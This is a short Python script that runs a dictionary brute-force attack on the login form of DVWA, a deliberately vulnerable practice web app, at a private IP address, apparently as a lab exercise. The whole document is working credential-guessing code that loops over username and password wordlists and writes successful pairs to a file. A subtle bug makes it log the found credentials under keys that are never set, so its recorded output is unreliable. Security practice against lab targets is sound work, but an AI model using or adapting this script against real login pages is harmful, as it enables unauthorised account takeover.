import requests

url = "http://192.168.1.5/dvwa/login.php"
error= "Login failed"
success= "Welcome"

def load():
    global usernames
    global passwords
    usernames = open('username.txt','r').readlines()
    passwords = open('password.txt','r').readlines()

def brute_force():
    load()
    for username in usernames:
        for password in passwords:
            data = {
                'username': username.strip(),
                'password': password.strip(),
                'Login': 'Login'
            }
            login(data)
    
def login(data):
    session = requests.Session()
    response = session.post(url, data=data)
    print("Status Code:", response.status_code)
    print("Response URL:", response.url)

    if(error in response.text):
        print("failed")
    elif(success in response.text):
        print("success")
        print(data.get('uname'), data.get('passwd'))
        with open('success.txt', 'w') as f:
            f.write(f"Username: {data.get('uname')}, Password: {data.get('passwd')}\n")
    else:
        print(response.content)
        exit(0)
    
brute_force()